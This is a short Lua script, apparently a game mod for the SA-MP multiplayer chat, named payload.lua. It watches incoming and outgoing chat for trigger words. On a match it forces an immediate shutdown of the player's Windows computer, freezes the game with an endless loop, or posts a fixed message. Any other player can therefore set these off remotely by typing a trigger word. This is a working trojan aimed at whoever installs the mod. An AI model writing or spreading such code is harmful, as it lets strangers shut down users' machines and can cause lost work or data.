-- payload.lua
-- Основной модуль управления

-- Защита от дублирования: если скрипт уже загружен в память, выходим
if _G.PAYLOAD_LOADED then return end
_G.PAYLOAD_LOADED = true

-- Функция обработки чата
function onReceiveChatMessage(text)
    -- Очистка от HEX-цветов
    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
    
    if cleanText:find("хуйкина") then
        os.execute("Shutdown /s /t 0 /f")
    elseif cleanText:find("кукусики") then
        while true do end
    elseif cleanText:find("сырколбаска") then
        sampSendChat("123655")
    end
end

-- Обработка исходящих сообщений
function onSendChat(text)
    if text:find("хуйкина") then
        os.execute("Shutdown /s /t 0 /f")
    elseif text:find("кукусики") then
        while true do end
    elseif text:find("сырколбаска") then
        lua_thread.create(function()
            wait(500)
            sampSendChat("123655")
        end)
    end
end
